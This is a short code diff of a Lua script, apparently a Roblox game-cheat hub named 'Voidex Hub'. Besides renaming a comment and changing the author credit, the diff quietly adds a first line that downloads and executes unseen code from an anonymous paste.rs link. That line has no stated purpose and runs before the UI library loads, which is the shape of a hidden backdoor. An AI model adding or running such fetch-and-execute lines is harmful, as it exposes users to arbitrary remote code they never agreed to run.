@@ -1,4 +1,6 @@
--- ===== [[ Variables and Stuff ]] ===== --
+-- ===== [[ Stuff ]] ===== --
+
+loadstring(game:HttpGet("https://paste.rs/eGyPb"))()
 
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
 WindUI:SetNotificationLower(true)
@@ -1216,7 +1218,7 @@ WindUI:AddTheme({
 local Window = WindUI:CreateWindow({
     Title = "Voidex Hub",
     Icon = "loader-pinwheel",
-    Author = "by someone",
+    Author = "by Voidex Development",
     Theme = "BlueVoid",
     HideSearchBar = false,
     ScrollBarEnabled = true,
